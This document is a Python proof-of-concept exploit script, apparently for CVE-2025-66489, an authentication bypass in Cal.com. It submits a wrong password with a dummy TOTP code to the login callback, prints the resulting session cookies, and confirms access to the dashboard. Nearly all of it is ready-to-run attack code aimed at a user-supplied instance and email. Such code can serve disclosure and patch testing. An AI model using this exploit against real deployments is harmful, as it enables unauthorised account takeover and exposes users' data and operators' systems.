import requests
import argparse

def bypass_auth(base_url, email, wrong_password, totp_code, csrf_token):
    """
    Attempts to bypass authentication by submitting a wrong password with a dummy TOTP code.
    """
    login_url = f"{base_url}/api/auth/callback/credentials"
    
    payload = {
        'csrfToken': csrf_token,
        'email': email,
        'password': wrong_password,
        'totpCode': totp_code
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    # Use a session to handle cookies (including session after successful bypass)
    session = requests.Session()
    response = session.post(login_url, data=payload, headers=headers)
    
    if response.status_code == 200 and 'redirect' in response.text.lower():
        print("[+] Bypass successful! Logged in without correct password.")
        print("[+] Session cookies:", session.cookies.get_dict())
        # Optionally, test access to a protected endpoint
        protected_url = f"{base_url}/dashboard"
        protected_response = session.get(protected_url)
        if protected_response.status_code == 200:
            print("[+] Access to dashboard confirmed.")
        else:
            print("[-] Failed to access protected resource.")
    else:
        print("[-] Bypass failed. Response:", response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-66489: Cal.com Auth Bypass")
    parser.add_argument("--url", required=True, help="Base URL of Cal.com instance (e.g., http://localhost:3000)")
    parser.add_argument("--email", required=True, help="Target email (e.g., user@example.com)")
    parser.add_argument("--password", default="wrongpass", help="Incorrect password to use")
    parser.add_argument("--totp", default="123456", help="Dummy TOTP code")
    parser.add_argument("--csrf", required=True, help="CSRF token from login form")
    
    args = parser.parse_args()
    bypass_auth(args.url, args.email, args.password, args.totp, args.csrf)
